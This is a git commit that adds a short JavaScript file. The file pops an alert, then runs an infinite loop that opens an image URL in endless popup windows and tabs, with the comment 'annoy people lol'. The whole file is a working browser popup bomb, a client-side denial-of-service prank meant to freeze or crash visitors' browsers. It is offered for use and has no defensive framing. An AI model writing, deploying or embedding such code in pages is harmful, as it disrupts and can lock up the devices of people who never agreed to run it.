eebf01a04ffd1fa6ba07e6b6b1b4becd9ffb61e2
pmzxyx <126836542+pmzxyx@users.noreply.github.com>
2023-03-03 13:54:23 -0800

    Create annoying infinite webpages thing.js

---
+++ annoying infinite webpages thing.js
@@ -0,0 +1,3 @@
+alert('use at your own risk');while (true) {window.open("https://i.insider.com/602ee9ced3ad27001837f2ac?width=700","", "width=1375, height=675");window.open("https://i.insider.com/602ee9ced3ad27001837f2ac?width=700");}
+
+//annoy people lol
